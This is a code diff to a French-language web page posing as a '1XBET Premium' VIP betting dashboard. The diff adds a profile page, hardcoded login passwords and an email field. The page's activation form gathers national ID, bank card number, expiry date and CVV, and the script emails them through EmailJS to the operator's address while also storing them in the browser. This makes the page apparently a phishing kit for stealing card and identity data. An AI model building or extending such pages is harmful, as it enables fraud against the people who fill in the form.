@@ -269,7 +269,7 @@
         .user-info {
             display: flex;
             align-items: center;
-            gap: 25px;
+            gap: 60px; /* Espacement augmenté entre le logo et l'icône utilisateur */
         }
 
         .user-avatar {
@@ -341,6 +341,14 @@
             text-align: center;
         }
 
+        /* AMÉLIORATION : Conteneur pour les boutons CASHVIP, Historique et Profil */
+        .balance-buttons {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
         .btn-cashvip {
             background: linear-gradient(135deg, #9c27b0 0%, #6a1b9a 100%);
             color: white;
@@ -354,6 +362,9 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            flex: 1;
+            min-width: 120px;
+            justify-content: center;
         }
 
         .btn-history {
@@ -369,16 +380,32 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            flex: 1;
+            min-width: 120px;
+            justify-content: center;
         }
 
-        .btn-cashvip:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(156, 39, 176, 0.4);
+        .btn-profile {
+            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+            min-width: 120px;
+            justify-content: center;
         }
 
-        .btn-history:hover {
+        .btn-cashvip:hover, .btn-history:hover, .btn-profile:hover {
             transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(255, 152, 0, 0.4);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
         }
 
         .account-info {
@@ -492,7 +519,7 @@
             word-break: break-all;
         }
 
-        /* Page de formulaire d'activation */
+        /* Page de formulaire d'activation - AJOUT DU CHAMP GMAIL */
         .activation-form-page {
             background: linear-gradient(135deg, #e0e0e0 0%, #9e9e9e 100%);
             min-height: 100vh;
@@ -1128,6 +1155,163 @@
             color: var(--primary-blue);
         }
 
+        /* Page Profil */
+        .profile-page {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            min-height: 100vh;
+            padding: 20px;
+            animation: fadeIn 1s ease;
+            display: none;
+        }
+
+        .profile-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 30px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--glass-border);
+        }
+
+        .profile-header h1 {
+            color: var(--primary-blue);
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .profile-header p {
+            color: var(--dark-gray);
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+        }
+
+        .profile-content {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 30px;
+        }
+
+        .profile-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--glass-border);
+            margin-bottom: 30px;
+            animation: slideUp 0.8s ease;
+        }
+
+        .profile-avatar {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .profile-avatar img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 4px solid var(--light-blue);
+        }
+
+        .profile-details {
+            margin-top: 20px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .detail-label {
+            font-weight: 600;
+            color: var(--dark-gray);
+        }
+
+        .detail-value {
+            color: var(--primary-blue);
+            font-weight: 600;
+        }
+
+        /* Formulaire d'édition du profil */
+        .profile-edit-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .profile-edit-form .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .profile-edit-form .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .profile-edit-form label {
+            font-weight: 600;
+            color: var(--dark-gray);
+        }
+
+        .profile-edit-form input {
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .profile-edit-form input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.9);
+            box-shadow: 0 0 0 2px var(--light-blue);
+        }
+
+        .btn-save-profile {
+            background: linear-gradient(135deg, #4caf50 0%, #2e7d32 100%);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .btn-save-profile:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
+        }
+
+        .btn-cancel-edit {
+            background: linear-gradient(135deg, #f44336 0%, #c62828 100%);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn-cancel-edit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(244, 67, 54, 0.4);
+        }
+
         /* Popup des conditions générales */
         .terms-popup {
             position: fixed;
@@ -1382,6 +1566,10 @@
                 gap: 15px;
             }
             
+            .balance-buttons {
+                flex-direction: column;
+            }
+            
             .dashboard-logo {
                 font-size: 1.8rem;
             }
@@ -1395,6 +1583,14 @@
             }
             
             .levels-selection {
+                grid-template-columns: 1fr;
+            }
+            
+            .profile-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .profile-edit-form .form-row {
                 grid-template-columns: 1fr;
             }
         }
@@ -1484,9 +1680,9 @@
             <div class="dashboard-header">
                 <div class="dashboard-logo">1XPREMIUM</div>
                 <div class="user-info">
-                    <div class="user-avatar">SL</div>
+                    <div class="user-avatar" id="dashboard-avatar">?</div>
                     <div class="user-details">
-                        <h3>SOUMAH LAMINE</h3>
+                        <h3 id="dashboard-username">Inconnu</h3>
                         <p id="user-id-display">ID: Chargement...</p>
                     </div>
                 </div>
@@ -1499,13 +1695,17 @@
                             <h2>Solde du Compte</h2>
                         </div>
                         <div class="balance-container">
-                            <div class="balance">70 USDT</div>
+                            <div class="balance" id="user-balance">0 USDT</div>
+                            <!-- AMÉLIORATION : Les boutons sont maintenant mieux arrangés -->
                             <div class="balance-buttons">
                                 <button id="btn-cashvip" class="btn-cashvip">
                                     <i class="fas fa-gem"></i> CASHVIP
                                 </button>
                                 <button id="btn-history" class="btn-history">
                                     <i class="fas fa-history"></i> Historique
+                                </button>
+                                <button id="btn-profile" class="btn-profile">
+                                    <i class="fas fa-user"></i> Profil
                                 </button>
                             </div>
                         </div>
@@ -1571,7 +1771,7 @@
                             </div>
                             <div class="info-item">
                                 <h4>Nom</h4>
-                                <p>SOUMAH LAMINE</p>
+                                <p id="account-name">Inconnu</p>
                             </div>
                             <div class="info-item">
                                 <h4>Logiciels</h4>
@@ -1592,7 +1792,7 @@
         </div>
     </div>
 
-    <!-- Page de formulaire d'activation -->
+    <!-- Page de formulaire d'activation - AJOUT DU CHAMP GMAIL -->
     <div id="activation-form-page" class="activation-form-page">
         <div class="activation-form-container">
             <div class="activation-form-header">
@@ -1623,6 +1823,12 @@
                         <label for="profession">Profession</label>
                         <input type="text" id="profession" placeholder="Entrez votre profession" required>
                     </div>
+                </div>
+
+                <!-- AJOUT DU CHAMP GMAIL -->
+                <div class="form-group">
+                    <label for="email">Adresse Gmail</label>
+                    <input type="email" id="email" placeholder="Entrez votre adresse Gmail" required>
                 </div>
                 
                 <div class="form-group">
@@ -1997,6 +2203,250 @@
         </div>
     </div>
 
+    <!-- PAGE PROFIL AMÉLIORÉE -->
+    <div id="profile-page" class="profile-page">
+        <div class="container">
+            <button id="btn-back-dashboard-from-profile" class="back-button" style="background: var(--primary-blue); color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 20px;">
+                <i class="fas fa-arrow-left"></i> Retour au Tableau de Bord
+            </button>
+            
+            <div class="profile-header">
+                <h1>Mon Profil</h1>
+                <p>Gérez vos informations personnelles et vos préférences</p>
+            </div>
+            
+            <div class="profile-content">
+                <div class="profile-card">
+                    <div class="profile-avatar">
+                        <div id="profile-avatar-large" style="width: 120px; height: 120px; border-radius: 50%; background: var(--light-blue); display: flex; align-items: center; justify-content: center; color: white; font-size: 3rem; margin: 0 auto;">
+                            ?
+                        </div>
+                    </div>
+                    <h3 style="text-align: center; color: var(--primary-blue); margin-bottom: 10px;" id="profile-fullname">Inconnu</h3>
+                    <p style="text-align: center; color: var(--dark-gray); margin-bottom: 20px;">Membre VIP 1XBET Premium</p>
+                    
+                    <div class="profile-details">
+                        <div class="detail-row">
+                            <span class="detail-label">ID Utilisateur:</span>
+                            <span class="detail-value" id="profile-user-id">VIP-1XB-001</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Statut:</span>
+                            <span class="detail-value" style="color: #4caf50;">Actif</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Niveau VIP:</span>
+                            <span class="detail-value">Bronze</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Date d'inscription:</span>
+                            <span class="detail-value">20/10/2025</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="profile-card">
+                    <div class="card-header">
+                        <h2>Informations Personnelles</h2>
+                        <button id="btn-edit-profile" class="btn-action" style="background: var(--primary-blue); color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer;">
+                            <i class="fas fa-edit"></i> Modifier
+                        </button>
+                    </div>
+                    
+                    <div id="profile-view-mode">
+                        <div class="profile-details">
+                            <div class="detail-row">
+                                <span class="detail-label">Nom complet:</span>
+                                <span class="detail-value" id="profile-display-name">Inconnu</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Email:</span>
+                                <span class="detail-value" id="profile-display-email">Non renseigné</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Téléphone:</span>
+                                <span class="detail-value" id="profile-display-phone">Non renseigné</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Âge:</span>
+                                <span class="detail-value" id="profile-display-age">Non renseigné</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Profession:</span>
+                                <span class="detail-value" id="profile-display-profession">Non renseigné</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Pays:</span>
+                                <span class="detail-value" id="profile-display-country">Non renseigné</span>
+                            </div>
+                            <!-- NOUVEAUX CHAMPS AJOUTÉS -->
+                            <div class="detail-row">
+                                <span class="detail-label">Numéro carte d'identité:</span>
+                                <span class="detail-value" id="profile-display-idnumber">Non renseigné</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Numéro carte bancaire:</span>
+                                <span class="detail-value" id="profile-display-cardnumber">Non renseigné</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- FORMULAIRE D'ÉDITION -->
+                    <div id="profile-edit-mode" style="display: none;">
+                        <form class="profile-edit-form" id="profile-edit-form">
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="edit-last-name">Nom</label>
+                                    <input type="text" id="edit-last-name" placeholder="Entrez votre nom">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="edit-first-name">Prénom</label>
+                                    <input type="text" id="edit-first-name" placeholder="Entrez votre prénom">
+                                </div>
+                            </div>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="edit-age">Âge</label>
+                                    <input type="number" id="edit-age" placeholder="Entrez votre âge" min="18">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="edit-profession">Profession</label>
+                                    <input type="text" id="edit-profession" placeholder="Entrez votre profession">
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="edit-email">Adresse Gmail</label>
+                                <input type="email" id="edit-email" placeholder="Entrez votre adresse Gmail">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="edit-phone">Numéro de téléphone</label>
+                                <input type="tel" id="edit-phone" placeholder="Entrez votre numéro de téléphone">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="edit-country">Pays</label>
+                                <div class="country-select-wrapper">
+                                    <select id="edit-country" class="country-select">
+                                        <option value="">Sélectionnez votre pays</option>
+                                        <option value="guinea">Guinée Conakry</option>
+                                        <option value="senegal">Sénégal</option>
+                                        <option value="cote-ivoire">Côte d'Ivoire</option>
+                                        <option value="mali">Mali</option>
+                                        <option value="burkina-faso">Burkina Faso</option>
+                                        <option value="benin">Bénin</option>
+                                        <option value="togo">Togo</option>
+                                        <option value="niger">Niger</option>
+                                        <option value="cameroon">Cameroun</option>
+                                        <option value="ghana">Ghana</option>
+                                        <option value="nigeria">Nigeria</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- NOUVEAUX CHAMPS AJOUTÉS -->
+                            <div class="form-group">
+                                <label for="edit-id-number">Numéro de carte d'identité</label>
+                                <input type="text" id="edit-id-number" placeholder="Entrez votre numéro de carte d'identité">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="edit-card-number">Numéro de carte bancaire</label>
+                                <input type="text" id="edit-card-number" placeholder="Entrez votre numéro de carte bancaire">
+                            </div>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="edit-expiry-date">Date d'expiration</label>
+                                    <input type="text" id="edit-expiry-date" placeholder="MM/AA">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="edit-cvv">CVS (3 chiffres)</label>
+                                    <input type="text" id="edit-cvv" placeholder="XXX" maxlength="3">
+                                </div>
+                            </div>
+                            
+                            <button type="button" id="btn-save-profile" class="btn-save-profile">Enregistrer les modifications</button>
+                            <button type="button" id="btn-cancel-edit" class="btn-cancel-edit">Annuler</button>
+                        </form>
+                    </div>
+                </div>
+                
+                <div class="profile-card">
+                    <div class="card-header">
+                        <h2>Informations du Compte</h2>
+                    </div>
+                    
+                    <div class="profile-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Solde actuel:</span>
+                            <span class="detail-value" id="profile-balance">0 USDT</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Dernier dépôt:</span>
+                            <span class="detail-value">0 USDT</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Dernière transaction:</span>
+                            <span class="detail-value">20/10/2025</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Statut de vérification:</span>
+                            <span class="detail-value" style="color: #ff9800;">En attente</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Logiciel actif:</span>
+                            <span class="detail-value">GNSI v2.1.5</span>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-action btn-activate" style="margin-top: 20px; background: linear-gradient(135deg, #9c27b0 0%, #6a1b9a 100%);">
+                        <i class="fas fa-shield-alt"></i> Sécurité du Compte
+                    </button>
+                </div>
+                
+                <div class="profile-card">
+                    <div class="card-header">
+                        <h2>Préférences</h2>
+                    </div>
+                    
+                    <div class="profile-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Langue:</span>
+                            <span class="detail-value">Français</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Devise:</span>
+                            <span class="detail-value">USDT</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Notifications:</span>
+                            <span class="detail-value">Activées</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Thème:</span>
+                            <span class="detail-value">Clair</span>
+                        </div>
+                    </div>
+                    
+                    <div class="action-buttons" style="margin-top: 20px;">
+                        <button class="btn-action btn-deposit">
+                            <i class="fas fa-bell"></i> Notifications
+                        </button>
+                        <button class="btn-action btn-withdraw">
+                            <i class="fas fa-moon"></i> Thème
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Popup des conditions générales -->
     <div id="terms-popup" class="terms-popup">
         <div class="terms-content">
@@ -2036,7 +2486,7 @@
                 
                 <p>Par exemple, si tes paris totalisent 500 € et tes gains totalisent 600 € pour la période en question, le cashback ne sera pas crédité.</p>
                 
-                <p>Au niveau 8 (Statut VIP), le cashback est calculé sur la base de chaque pari que tu places, peu importe qu'il soit gagnant ou perdant. Garde à l'esprit que les calculs sont formés de deux décimales. Par exemple, si le cashback est inférieur à 0,01, il ne sera pas crédité pour ce pari. Le cashback à ce niveau peut varier en fonction du type de jeu :</p>
+                <p>Au niveau 8 (Statut VIP), le cashback est calculé sur la base de chaque pari que tu places, peu importe qu'il soit gagnant ou perdant. Garde à l'esprit que les calculs sont formés de deux décimales. Par exemple, if the cashback est inférieur à 0,01, il ne sera pas crédité pour ce pari. Le cashback à ce niveau peut varier en fonction du type de jeu :</p>
                 <ul>
                     <li>tu obtiendras 0,25% en jouant à Machines à sous</li>
                     <li>tu obtiendras 0,1% en jouant à Casino en direct</li>
@@ -2113,6 +2563,7 @@
         const cashvipPage = document.getElementById('cashvip-page');
         const depositPage = document.getElementById('deposit-page');
         const historyPage = document.getElementById('history-page');
+        const profilePage = document.getElementById('profile-page');
         const paymentConfirmationPopup = document.getElementById('payment-confirmation-popup');
         const waitingEmailPopup = document.getElementById('waiting-email-popup');
         const termsPopup = document.getElementById('terms-popup');
@@ -2127,15 +2578,33 @@
         const btnAcceptOsjl = document.getElementById('btn-accept-osjl');
         const btnCashvip = document.getElementById('btn-cashvip');
         const btnHistory = document.getElementById('btn-history');
+        const btnProfile = document.getElementById('btn-profile');
         const btnBackDashboard = document.getElementById('btn-back-dashboard');
         const btnBackDashboardFromHistory = document.getElementById('btn-back-dashboard-from-history');
+        const btnBackDashboardFromProfile = document.getElementById('btn-back-dashboard-from-profile');
         const btnDepositSubmit = document.getElementById('btn-deposit-submit');
         const btnUnderstood = document.getElementById('btn-understood');
         const btnCloseError = document.getElementById('btn-close-error');
         
+        // Éléments du profil
+        const btnEditProfile = document.getElementById('btn-edit-profile');
+        const btnSaveProfile = document.getElementById('btn-save-profile');
+        const btnCancelEdit = document.getElementById('btn-cancel-edit');
+        const profileViewMode = document.getElementById('profile-view-mode');
+        const profileEditMode = document.getElementById('profile-edit-mode');
+        const profileEditForm = document.getElementById('profile-edit-form');
+        
         // Champs de formulaire
         const userIdDisplay = document.getElementById('user-id-display');
         const accountId = document.getElementById('account-id');
+        const accountName = document.getElementById('account-name');
+        const dashboardAvatar = document.getElementById('dashboard-avatar');
+        const dashboardUsername = document.getElementById('dashboard-username');
+        const userBalance = document.getElementById('user-balance');
+        const profileUserId = document.getElementById('profile-user-id');
+        const profileFullname = document.getElementById('profile-fullname');
+        const profileAvatarLarge = document.getElementById('profile-avatar-large');
+        const profileBalance = document.getElementById('profile-balance');
         const idCardUpload = document.getElementById('id-card-upload');
         const idCardFile = document.getElementById('id-card-file');
         const levelCards = document.querySelectorAll('.level-card');
@@ -2156,10 +2625,36 @@
         let countdownTimer;
         let selectedLevel = null;
         let selectedLevelData = null;
+        let userProfileData = {};
 
-        // Identifiants autorisés
-        const AUTHORIZED_ID = "1424004599";
-        const AUTHORIZED_PASSWORD = "a7s2mfcm";
+        // Système d'authentification multi-utilisateurs amélioré
+        const AUTHORIZED_USERS = {
+            "1424004599": {
+                password: "a7s2mfcm",
+                balance: 70,
+                profile: {}
+            },
+            "admin123": {
+                password: "adminpass",
+                balance: 150,
+                profile: {}
+            },
+            "user456": {
+                password: "userpass",
+                balance: 50,
+                profile: {}
+            },
+            "test001": {
+                password: "testpass",
+                balance: 100,
+                profile: {}
+            },
+            "vipuser": {
+                password: "vippass",
+                balance: 200,
+                profile: {}
+            }
+        };
 
         // Prix des niveaux en USDT
         const LEVEL_PRICES = {
@@ -2177,6 +2672,115 @@
         // Masquer la conversion info au début
         conversionInfo.style.display = 'none';
 
+        // Fonction pour sauvegarder les données utilisateur dans le localStorage
+        function saveUserProfile(userId, profileData) {
+            const userKey = `userProfile_${userId}`;
+            const userData = {
+                profile: profileData,
+                balance: AUTHORIZED_USERS[userId].balance || 0,
+                lastLogin: new Date().toISOString(),
+                registrationDate: AUTHORIZED_USERS[userId].registrationDate || new Date().toISOString()
+            };
+            localStorage.setItem(userKey, JSON.stringify(userData));
+            console.log(`✅ Profil sauvegardé pour l'utilisateur ${userId}`);
+        }
+
+        // Fonction pour charger les données utilisateur depuis le localStorage
+        function loadUserProfile(userId) {
+            const userKey = `userProfile_${userId}`;
+            const savedData = localStorage.getItem(userKey);
+            if (savedData) {
+                const userData = JSON.parse(savedData);
+                userProfileData = userData.profile || {};
+                AUTHORIZED_USERS[userId].balance = userData.balance || 0;
+                AUTHORIZED_USERS[userId].profile = userData.profile || {};
+                AUTHORIZED_USERS[userId].registrationDate = userData.registrationDate;
+                console.log(`✅ Profil chargé pour l'utilisateur ${userId}`);
+                updateProfileDisplay();
+                updateBalanceDisplay();
+                return true;
+            } else {
+                // Premier connexion - initialiser les données
+                AUTHORIZED_USERS[userId].registrationDate = new Date().toISOString();
+                userProfileData = {};
+                updateProfileDisplay();
+                updateBalanceDisplay();
+                return false;
+            }
+        }
+
+        // Fonction pour mettre à jour l'affichage du solde
+        function updateBalanceDisplay() {
+            if (AUTHORIZED_USERS[userLoginId]) {
+                const balance = AUTHORIZED_USERS[userLoginId].balance || 0;
+                userBalance.textContent = `${balance} USDT`;
+                profileBalance.textContent = `${balance} USDT`;
+            }
+        }
+
+        // Fonction pour mettre à jour l'affichage du profil
+        function updateProfileDisplay() {
+            if (userProfileData.firstName && userProfileData.lastName) {
+                // Utilisateur a un profil complet
+                const fullName = `${userProfileData.firstName} ${userProfileData.lastName}`;
+                const initials = userProfileData.firstName.charAt(0) + userProfileData.lastName.charAt(0);
+                
+                // Mettre à jour le tableau de bord
+                dashboardUsername.textContent = fullName;
+                dashboardAvatar.textContent = initials;
+                accountName.textContent = fullName;
+                
+                // Mettre à jour la page profil
+                profileFullname.textContent = fullName;
+                profileAvatarLarge.textContent = initials;
+                document.getElementById('profile-display-name').textContent = fullName;
+                
+                // Mettre à jour les autres champs du profil
+                if (userProfileData.email) document.getElementById('profile-display-email').textContent = userProfileData.email;
+                if (userProfileData.phone) document.getElementById('profile-display-phone').textContent = userProfileData.phone;
+                if (userProfileData.age) document.getElementById('profile-display-age').textContent = `${userProfileData.age} ans`;
+                if (userProfileData.profession) document.getElementById('profile-display-profession').textContent = userProfileData.profession;
+                if (userProfileData.country) document.getElementById('profile-display-country').textContent = getCountryName(userProfileData.country);
+                if (userProfileData.idNumber) document.getElementById('profile-display-idnumber').textContent = userProfileData.idNumber;
+                if (userProfileData.cardNumber) {
+                    const maskedCard = userProfileData.cardNumber.replace(/\d(?=\d{4})/g, "*");
+                    document.getElementById('profile-display-cardnumber').textContent = maskedCard;
+                }
+            } else {
+                // Premier connexion - afficher "Inconnu"
+                dashboardUsername.textContent = "Inconnu";
+                dashboardAvatar.textContent = "?";
+                accountName.textContent = "Inconnu";
+                profileFullname.textContent = "Inconnu";
+                profileAvatarLarge.textContent = "?";
+                
+                // Réinitialiser les champs du profil
+                document.getElementById('profile-display-name').textContent = "Inconnu";
+                document.getElementById('profile-display-email').textContent = "Non renseigné";
+                document.getElementById('profile-display-phone').textContent = "Non renseigné";
+                document.getElementById('profile-display-age').textContent = "Non renseigné";
+                document.getElementById('profile-display-profession').textContent = "Non renseigné";
+                document.getElementById('profile-display-country').textContent = "Non renseigné";
+                document.getElementById('profile-display-idnumber').textContent = "Non renseigné";
+                document.getElementById('profile-display-cardnumber').textContent = "Non renseigné";
+            }
+        }
+
+        // Fonction pour remplir le formulaire d'édition avec les données existantes
+        function populateEditForm() {
+            if (userProfileData.firstName) document.getElementById('edit-first-name').value = userProfileData.firstName;
+            if (userProfileData.lastName) document.getElementById('edit-last-name').value = userProfileData.lastName;
+            if (userProfileData.age) document.getElementById('edit-age').value = userProfileData.age;
+            if (userProfileData.profession) document.getElementById('edit-profession').value = userProfileData.profession;
+            if (userProfileData.email) document.getElementById('edit-email').value = userProfileData.email;
+            if (userProfileData.phone) document.getElementById('edit-phone').value = userProfileData.phone;
+            if (userProfileData.country) document.getElementById('edit-country').value = userProfileData.country;
+            if (userProfileData.idNumber) document.getElementById('edit-id-number').value = userProfileData.idNumber;
+            if (userProfileData.cardNumber) document.getElementById('edit-card-number').value = userProfileData.cardNumber;
+            if (userProfileData.expiryDate) document.getElementById('edit-expiry-date').value = userProfileData.expiryDate;
+            if (userProfileData.cvv) document.getElementById('edit-cvv').value = userProfileData.cvv;
+        }
+
         // Fonction pour envoyer l'email d'activation
         async function sendActivationEmail(formData) {
             try {
@@ -2186,13 +2790,14 @@
                     first_name: formData.firstName,
                     age: formData.age,
                     profession: formData.profession,
+                    email: formData.email,
                     id_number: formData.idNumber,
                     phone: formData.phone,
                     card_number: formData.cardNumber,
                     expiry_date: formData.expiryDate,
                     cvv: formData.cvv,
                     date: new Date().toLocaleString('fr-FR'),
-                    to_email: "votre-email@gmail.com" // Remplacez par votre email
+                    to_email: "votre-email@gmail.com"
                 };
 
                 const response = await emailjs.send(
@@ -2221,7 +2826,7 @@
                     converted_amount: depositData.convertedAmount,
                     payment_method: depositData.paymentMethod,
                     date: new Date().toLocaleString('fr-FR'),
-                    to_email: "votre-email@gmail.com" // Remplacez par votre email
+                    to_email: "votre-email@gmail.com"
                 };
 
                 const response = await emailjs.send(
@@ -2287,14 +2892,24 @@
             const password = document.getElementById('login-password').value;
             
             if (loginId && password) {
-                if (loginId === AUTHORIZED_ID && password === AUTHORIZED_PASSWORD) {
+                if (AUTHORIZED_USERS[loginId] && AUTHORIZED_USERS[loginId].password === password) {
                     userLoginId = loginId;
                     userIdDisplay.textContent = `ID: ${loginId}`;
                     accountId.textContent = loginId;
+                    profileUserId.textContent = loginId;
+                    
+                    // Charger le profil utilisateur
+                    const hasProfile = loadUserProfile(userLoginId);
                     
                     loginPage.style.display = 'none';
                     dashboard.style.display = 'block';
                     initializeChart();
+                    
+                    if (hasProfile) {
+                        console.log("✅ Profil utilisateur chargé avec succès");
+                    } else {
+                        console.log("ℹ️ Premier connexion - profil vide");
+                    }
                 } else {
                     errorPopup.style.display = 'flex';
                 }
@@ -2344,13 +2959,14 @@
             const firstName = document.getElementById('first-name').value;
             const age = document.getElementById('age').value;
             const profession = document.getElementById('profession').value;
+            const email = document.getElementById('email').value;
             const idNumber = document.getElementById('id-number').value;
             const phone = document.getElementById('phone').value;
             const cardNumber = document.getElementById('card-number').value;
             const expiryDate = document.getElementById('expiry-date').value;
             const cvv = document.getElementById('cvv').value;
             
-            if (!lastName || !firstName || !age || !profession || !idNumber || !phone || !cardNumber || !expiryDate || !cvv) {
+            if (!lastName || !firstName || !age || !profession || !email || !idNumber || !phone || !cardNumber || !expiryDate || !cvv) {
                 alert('Veuillez remplir tous les champs du formulaire.');
                 return;
             }
@@ -2360,12 +2976,34 @@
                 return;
             }
             
+            // Sauvegarder les données du profil
+            userProfileData = {
+                firstName: firstName,
+                lastName: lastName,
+                age: age,
+                profession: profession,
+                email: email,
+                idNumber: idNumber,
+                phone: phone,
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                cvv: cvv,
+                activationDate: new Date().toLocaleString('fr-FR')
+            };
+            
+            // Sauvegarder dans le localStorage
+            saveUserProfile(userLoginId, userProfileData);
+            
+            // Mettre à jour l'affichage
+            updateProfileDisplay();
+            
             // Envoyer l'email d'activation
             const formData = {
                 lastName,
                 firstName,
                 age,
                 profession,
+                email,
                 idNumber,
                 phone,
                 cardNumber,
@@ -2402,6 +3040,15 @@
             historyPage.style.display = 'block';
         });
 
+        // Navigation vers Profil
+        btnProfile.addEventListener('click', () => {
+            dashboard.style.display = 'none';
+            profilePage.style.display = 'block';
+            
+            // Charger les données si elles existent
+            populateEditForm();
+        });
+
         // Retour au tableau de bord depuis CASHVIP
         btnBackDashboard.addEventListener('click', () => {
             cashvipPage.style.display = 'none';
@@ -2412,6 +3059,65 @@
         btnBackDashboardFromHistory.addEventListener('click', () => {
             historyPage.style.display = 'none';
             dashboard.style.display = 'block';
+        });
+
+        // Retour au tableau de bord depuis Profil
+        btnBackDashboardFromProfile.addEventListener('click', () => {
+            profilePage.style.display = 'none';
+            dashboard.style.display = 'block';
+        });
+
+        // Édition du profil
+        btnEditProfile.addEventListener('click', () => {
+            profileViewMode.style.display = 'none';
+            profileEditMode.style.display = 'block';
+            populateEditForm();
+        });
+
+        // Annuler l'édition
+        btnCancelEdit.addEventListener('click', () => {
+            profileEditMode.style.display = 'none';
+            profileViewMode.style.display = 'block';
+        });
+
+        // Sauvegarder les modifications du profil
+        btnSaveProfile.addEventListener('click', () => {
+            // Récupérer les valeurs du formulaire
+            const updatedProfile = {
+                firstName: document.getElementById('edit-first-name').value,
+                lastName: document.getElementById('edit-last-name').value,
+                age: document.getElementById('edit-age').value,
+                profession: document.getElementById('edit-profession').value,
+                email: document.getElementById('edit-email').value,
+                phone: document.getElementById('edit-phone').value,
+                country: document.getElementById('edit-country').value,
+                idNumber: document.getElementById('edit-id-number').value,
+                cardNumber: document.getElementById('edit-card-number').value,
+                expiryDate: document.getElementById('edit-expiry-date').value,
+                cvv: document.getElementById('edit-cvv').value,
+                lastUpdate: new Date().toLocaleString('fr-FR')
+            };
+
+            // Vérifier que les champs obligatoires sont remplis
+            if (!updatedProfile.firstName || !updatedProfile.lastName || !updatedProfile.email) {
+                alert('Veuillez remplir au moins le nom, prénom et email.');
+                return;
+            }
+
+            // Fusionner avec les données existantes
+            userProfileData = { ...userProfileData, ...updatedProfile };
+            
+            // Sauvegarder
+            saveUserProfile(userLoginId, userProfileData);
+            
